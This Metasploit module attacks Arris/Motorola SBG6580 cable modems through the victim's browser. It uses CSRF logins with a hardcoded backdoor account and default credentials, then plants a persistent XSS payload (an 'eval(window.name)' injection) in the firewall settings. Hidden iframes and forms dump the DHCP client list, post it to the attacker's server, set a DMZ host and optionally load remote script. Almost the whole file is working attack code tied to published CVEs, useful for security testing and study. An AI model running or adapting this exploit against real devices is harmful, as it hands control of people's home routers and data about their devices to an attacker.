##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Arris / Motorola Surfboard SBG6580 Web Interface Takeover',
      'Description'    => %q{

        The web interface for the Arris / Motorola Surfboard SBG6580 has
        several vulnerabilities that, when combined, allow an arbitrary website to take
        control of the modem, even if the user is not currently logged in. The attacker
        must successfully know, or guess, the target's internal gateway IP address.
        This is usually a default value of 192.168.0.1.

        First, a hardcoded backdoor account was discovered in the source code
        of one device with the credentials "technician/yZgO8Bvj". Due to lack of CSRF
        in the device's login form, these credentials - along with the default
        "admin/motorola" - can be sent to the device by an arbitrary website, thus
        inadvertently logging the user into the router.

        Once successfully logged in, a persistent XSS vulnerability is
        exploited in the firewall configuration page. This allows injection of
        Javascript that can perform any available action in the router interface.

        The following firmware versions have been tested as vulnerable:

        SBG6580-6.5.2.0-GA-06-077-NOSH, and
        SBG6580-8.6.1.0-GA-04-098-NOSH

      },
      'Author'         => [ 'joev' ],
      'DisclosureDate' => 'Apr 08 2015',
      'License'        => MSF_LICENSE,
      'Actions'        => [ [ 'WebServer' ] ],
      'PassiveActions' => [ 'WebServer' ],
      'DefaultAction'  => 'WebServer',
      'References' => [
        [ 'CVE', '2015-0964' ], # XSS vulnerability
        [ 'CVE', '2015-0965' ], # CSRF vulnerability
        [ 'CVE', '2015-0966' ], # "techician/yZgO8Bvj" web interface backdoor
        [ 'URL', 'https://community.rapid7.com/community/infosec/blog/2015/06/05/r7-2015-01-csrf-backdoor-and-persistent-xss-on-arris-motorola-cable-modems' ],
      ]
    ))

    register_options([
      OptString.new('DEVICE_IP', [
        false,
        "Internal IP address of the vulnerable device.",
        '192.168.0.1'
      ]),
      OptString.new('LOGINS', [
        false,
        "Comma-separated list of user/pass combinations to attempt.",
        'technician/yZgO8Bvj,admin/motorola'
      ]),
      OptBool.new('DUMP_DHCP_LIST', [
        true,
        "Dump the MAC, IP, and hostnames of all registered DHCP clients.",
        true
      ]),
      OptInt.new('SET_DMZ_HOST', [
        false,
        "The final octet of the IP address to set in the DMZ (1-255).",
        nil
      ]),
      OptString.new('BLOCK_INTERNET_ACCESS', [
        false,
        "Comma-separated list of IP addresses to block internet access for.",
        ''
      ]),
      OptString.new('CUSTOM_JS', [
        false,
        "A string of javascript to execute in the context of the device web interface.",
        ''
      ]),
      OptString.new('REMOTE_JS', [
        false,
        "A URL to inject into a script tag in the context of the device web interface.",
        ''
      ])
    ])
  end

  def run
    if datastore['SET_DMZ_HOST']
      dmz_host = datastore['SET_DMZ_HOST'].to_i
      if dmz_host < 1 || dmz_host > 255
        raise ArgumentError, "DMZ host must be an integer between 1 and 255."
      end
    end

    exploit
  end

  def on_request_uri(cli, request)
    if request.method =~ /post/i
      file = store_loot(
        "dhcp.clients", "text/json", cli.peerhost,
        request.body, "arris_surfboard_xss", "DHCP client list gathered from modem"
      )
      print_good "Dumped DHCP client list from #{cli.peerhost}"
      print_good file
    elsif request.uri =~ /\/dmz$/i
      print_good "DMZ host successfully reset to #{datastore['SET_DMZ_HOST']}."
      send_response_html(cli, '')
    else
      send_response_html(cli, exploit_html)
    end
  end

  def set_dmz_host_js
    return '' unless datastore['SET_DMZ_HOST'].present?
    %Q|
      var x = new XMLHttpRequest;
      x.open('POST', '/goform/RgDmzHost.pl');
      x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
      x.send('DmzHostIP3=#{datastore['SET_DMZ_HOST']}');
      top.postMessage(JSON.stringify({type:'dmz',done:true}), '*');
    |
  end

  def dump_dhcp_list_js
    return '' unless datastore['DUMP_DHCP_LIST']
    %Q|
      var f = document.createElement('iframe');
      f.src = '/RgDhcp.asp';
      f.onload = function() {
        var mac = f.contentDocument.querySelector('input[name="dhcpmacaddr1"]');
        var rows = [];
        if (mac) {
          var tr = mac.parentNode.parentNode;
          while (tr) {
            if (tr.tagName === 'TR' && !tr.querySelector('input[type="Submit"]')) {
              var tds = [].slice.call(tr.children);
              var row = [];
              rows.push(row);
              for (var i in tds) {
                row.push(tds[i].innerText);
              }
            }
            tr = tr.nextSibling;
          }
        }
        if (rows.length > 0) {
          top.postMessage(JSON.stringify({type:'dhcp',rows:rows}), '*');
          document.body.removeChild(f);
        }
      };
      document.body.appendChild(f);
    |
  end

  def exploit_js
    [
      dump_dhcp_list_js,
      set_dmz_host_js,
      custom_js
    ].join("\n")
  end

  def exploit_html
    <<-EOS
<!doctype html>
<html>
<body>

<script>

window.onmessage = function(e) {
  var data = JSON.parse(e.data);
  if (data.type == 'dhcp') {
    var rows = JSON.stringify(data.rows);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '#{get_uri}/collect');
    xhr.send(rows);
  } else if (data.type == 'dmz') {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '#{get_uri}/dmz');
    xhr.send();
  }
}

var js = (#{JSON.generate({ js: exploit_js })}).js;

var HIDDEN_STYLE =
  'position:absolute;left:-9999px;top:-9999px;';

function exploit(hosts, logins) {
  for (var idx in hosts) {
    buildImage(hosts[idx]);
  }

  function buildImage(host) {
    var img = new Image();
    img.src = host + '/images/px1_Ux.png';
    img.setAttribute('style', HIDDEN_STYLE);
    img.onload = function() {
      if (img.width === 1 && img.height === 1) {
        deviceFound(host, img);
      }
      img.parentNode.removeChild(img);
    };
    img.onerror = function() {
      img.src = host + '/logo_new.gif';
      img.onload = function() {
        if (img.width === 176 && img.height === 125) {
          deviceFound(host, img);
        }
      }
      img.onerror = function() {
        img.parentNode.removeChild(img);
      };
    };
    document.body.appendChild(img);
  }

  function deviceFound(host, img) {
    // but also lets attempt to log the user in with every login
    var count = 0;
    for (var idx in logins) {
      attemptLogin(host, logins[idx], function() {
        if (++count >= logins.length) {
          attemptExploit(host);
        }
      })
    }
  }

  function attemptExploit(host) {
    var form = document.createElement('form');
    form.setAttribute('style', HIDDEN_STYLE);
    form.setAttribute('method', 'POST');
    form.setAttribute('action', host+'/goform/RgFirewallEL')
    document.body.appendChild(form);

    var inputs = [];
    var inputNames = [
      'EmailAddress', 'SmtpServerName', 'SmtpUsername',
      'SmtpPassword', 'LogAction'
    ];

    var input;
    for (var idx in inputNames) {
      input = document.createElement('input');
      input.setAttribute('type', 'hidden');
      input.setAttribute('name', inputNames[idx]);
      form.appendChild(input);
      inputs.push(input)
    }
    inputs[0].setAttribute('value', '<script>@a.com<script>eval(window.name);<\\/script>');
    inputs[inputs.length-1].setAttribute('value', '0');

    var iframe = document.createElement('iframe');
    iframe.setAttribute('style', HIDDEN_STYLE);

    window.id = window.id || 1;
    var name = '/*abc'+(window.id++)+'*/ '+js;
    iframe.setAttribute('name', name);
    document.body.appendChild(iframe);

    form.setAttribute('target', name);
    form.submit();

    setTimeout(function() {
      iframe.removeAttribute('sandbox');
      iframe.src = host+'/RgFirewallEL.asp';
    }, 1000);
  }

  function attemptLogin(host, login, cb) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', host+'/goform/login');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('loginUsername='+encodeURIComponent(login[0])+
               '&loginPassword='+encodeURIComponent(login[1]));
      xhr.onerror = function() {
        cb && cb();
        cb = null;
      }
    } catch(e) {};
  }
}

var logins = (#{JSON.generate({ logins: datastore['LOGINS'] })}).logins;
var combos = logins.split(',');
var splits = [], s = '';
for (var i in combos) {
  s = combos[i].split('/');
  splits.push([s[0], s[1]]);
}

exploit(['http://#{datastore['DEVICE_IP']}'], splits);

</script>

</body>
</html>
EOS
  end

  def custom_js
    rjs_hook + datastore['CUSTOM_JS']
  end

  def rjs_hook
    remote_js = datastore['REMOTE_JS']
    if remote_js.present?
      "var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); "
    else
      ''
    end
  end
end
